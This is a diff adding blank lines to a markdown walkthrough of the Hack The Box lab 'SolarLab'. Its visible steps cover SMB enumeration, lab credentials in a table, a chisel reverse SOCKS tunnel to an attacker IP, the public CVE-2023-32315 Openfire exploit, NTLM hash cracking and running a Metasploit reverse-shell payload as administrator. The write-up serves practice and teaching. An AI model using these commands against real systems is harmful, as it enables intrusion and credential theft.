@@ -19,6 +19,7 @@ NMAP
 Add solarlab.htb and report.solarlab.htb to /etc/hosts
 
 - **<u>Enumerate port 445:</u>**
+
 ```bash
 enum4linux -u Guest -p "" -a solarlab.htb
 
@@ -32,6 +33,7 @@ enum4linux -u Guest -p "" -a solarlab.htb
 
 - Download the content and look for metadata:
 ```bash
+
 exiftool concepts/* old_leave_request_form.docx details-file.xlsx  | grep "Modified" & exiftool concepts/* old_leave_request_form.docx details-file.xlsx | grep "Creator"
 
 ```
@@ -49,6 +51,7 @@ exiftool concepts/* old_leave_request_form.docx details-file.xlsx  | grep "Modif
 | blake.byte                 | ThisCanB3typedeasily1@ |
 | AlexanderK                 | danenacia9234n         |
 | ClaudiaS                   | dadsfawe9dafkn         |
+
 
 **<u>Enumerate port 6791:</u>**
 
@@ -138,11 +141,13 @@ blakeb - ThisCanB3typedeasily1@
 <u>Upload chisel</u>
 
 - On Kali:
+
 ```bash
 ./chisel server -p 8888 --reverse
 ```
 
 - On target:
+
 ```bash
 .\chisel.exe client 10.10.14.69:8888 R:socks &
 
@@ -173,6 +178,7 @@ git clone https://github.com/miko550/CVE-2023-32315.git
 
 ```
 - **Since we don't have a valid user, do the following:**
+
 ```bash
 cd CVE-2023-32315
 pip3 install -r requirements.txt
@@ -245,6 +251,7 @@ hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 - Clone the repo
 
 - Build the file:
+
 ```bash
 javac OpenFireDecryptPass.java
 
@@ -263,6 +270,7 @@ java OpenFireDecryptPass 'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77
 We get: **ThisPasswordShouldDo!@**
 
 - Use RunasCs to run a msf payload:
+
 ```bash
 .\runascs.exe administrator ThisPasswordShouldDo!@ ".\rev.exe"
 
